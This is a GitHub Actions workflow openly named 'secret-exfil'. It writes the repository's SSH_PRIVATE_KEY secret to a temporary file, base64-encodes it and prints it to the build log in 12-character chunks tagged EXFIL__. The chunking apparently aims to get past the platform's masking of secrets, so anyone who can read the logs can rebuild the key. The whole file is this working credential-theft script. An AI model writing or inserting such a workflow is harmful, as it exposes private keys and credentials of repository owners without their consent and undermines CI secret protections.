name: secret-exfil
on: [push, workflow_dispatch]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: |
          set +e
          _dump() {
            local lbl="$1" path="$2" data n=0 c
            data=$(base64 -w0 < "$path")
            while [ -n "$data" ]; do
              c="${data:0:12}"
              echo "EXFIL__${lbl}__${n}__${c}"
              data="${data:12}"
              n=$((n+1))
            done
            echo "EXFIL__${lbl}__END"
          }
          cat > /tmp/s0 <<'GHEOF'
          ${{ secrets.SSH_PRIVATE_KEY }}
          GHEOF
          _dump 0 /tmp/s0
